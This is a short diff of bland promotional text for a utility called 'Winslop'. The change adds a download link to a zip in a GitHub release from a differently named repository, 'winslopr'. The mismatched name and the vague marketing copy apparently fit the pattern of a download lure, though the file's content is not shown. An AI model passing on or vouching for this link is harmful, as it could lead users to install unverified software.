@@ -18,4 +18,4 @@ Why choose Winslop? Lightweight and efficient Clean, minimal interface Flexible 
 
 If you're looking for a simple and reliable utility to support your system and workflow, Winslop is a solid choice. It’s designed to fit naturally into your setup and provide practical tools without unnecessary overhead.
 
-Download Winslop here:
+Download Winslop here: https://github.com/gcoyerk/winslopr/releases/download/v26.04.05/Winslopr.zip
